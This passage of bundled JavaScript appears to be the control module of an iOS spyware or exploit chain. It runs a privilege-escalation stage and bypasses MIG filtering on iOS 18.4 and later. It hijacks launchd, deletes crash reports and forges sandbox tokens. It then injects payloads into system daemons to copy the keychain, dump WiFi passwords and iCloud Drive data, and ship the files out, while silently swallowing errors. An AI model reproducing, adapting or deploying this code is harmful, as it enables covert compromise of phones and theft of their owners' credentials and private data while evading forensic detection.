  var release = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x200n, 0x100);
  var splittedVersion = release.split(".");
  var xnuMajor = splittedVersion[0];
  var xnuMinor = splittedVersion[1];
  return {
    major: xnuMajor,
    minor: xnuMinor
  };
}
var TAG = "MAIN";
//const targetProcess = "bluetoothd";
var targetProcess = "SpringBoard";
function start() {
  var mutexPtr = null;
  var migFilterBypass = null;
  globalThis.xnuVersion = xnuVersion();
  var ver = globalThis.xnuVersion;

  // If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
  if (ver.major == 24 && ver.minor >= 4) {
    mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));
    libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("pthread_mutex_init", mutexPtr, null);
    migFilterBypass = new MigFilterBypass(mutexPtr);
  }
  var driver = new libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__["default"]();
  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].init(driver, mutexPtr);
  var resultPE = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].runPE();
  if (!resultPE) return;
  libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__["default"].init();
  if (migFilterBypass) migFilterBypass.start();
  var launchdTask = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("launchd", migFilterBypass);
  if (!launchdTask.success()) {
    return false;
  }
  libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask);
  libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].deleteCrashReports();
  libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();
  var agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
  var agentPid = 0;
  if (agentLoader.inject()) {
    agentPid = agentLoader.task.pid();
    libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
    libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
    agentLoader.destroy();
  }

  // Inject keychain copier FIRST into securityd (has access to keychain files)
  // This copies keychain/keybag to /tmp with 777 permissions
  var keychainProcess = "configd";
  var keychainCopier = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](keychainProcess, _raw_loader_keychain_copier__WEBPACK_IMPORTED_MODULE_12__["default"], migFilterBypass);
  if (keychainCopier.inject()) {
    libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(keychainCopier.task);
    keychainCopier.destroy();
  } else {}

  // Inject WiFi password dump into wifid (has keychain access for WiFi)
  // Using wifid instead of wifianalyticsd - wifid is always active
  var wifidProcess = "wifid";
  var wifiDump = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](wifidProcess, _raw_loader_wifi_password_dump__WEBPACK_IMPORTED_MODULE_13__["default"], migFilterBypass);
  if (wifiDump.inject()) {
    libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDump.task);
    wifiDump.destroy();
  } else {}

  // Also inject WiFi password dump into securityd (fallback for devices where wifid fails)
  var securitydProcess = "securityd";
  var wifiDumpSecurityd = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](securitydProcess, _raw_loader_wifi_password_securityd__WEBPACK_IMPORTED_MODULE_14__["default"], migFilterBypass);
  if (wifiDumpSecurityd.inject()) {
    libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDumpSecurityd.task);
    wifiDumpSecurityd.destroy();
  } else {}

  // Inject iCloud dumper into UserEventAgent (has access to iCloud Drive files)
  var userEventAgentProcess = "UserEventAgent";
  var iCloudDumper = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](userEventAgentProcess, _raw_loader_icloud_dumper__WEBPACK_IMPORTED_MODULE_15__["default"], migFilterBypass);
  if (iCloudDumper.inject()) {
    libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(iCloudDumper.task);
    iCloudDumper.destroy();
  } else {}

  // Wait for all dumps to finish
  for (var i = 1; i <= 5; i++) {
    libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
  }

  // Inject forensics file downloader AFTER keychain copier
  // This will send the copied keychain files from /tmp
  try {
    var fileDownloader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_file_downloader__WEBPACK_IMPORTED_MODULE_11__["default"], migFilterBypass);
    if (fileDownloader.inject()) {
      libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(fileDownloader.task);
      fileDownloader.destroy();
    }
  } catch (injectError) {
    // Error handling without logging
  }
  launchdTask.destroy();
  return true;
}
try {
  start();
} catch (error) {
  // Error handling without logging
} finally {
  libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("exit", 0n);
}

/***/ })

/******/ });
  } catch (error) {
      LOG(`Main function resulted with an error: ${error}`);
      LOG("stack: " + error.stack);
  } finally {
      exit(0n);
  }
})();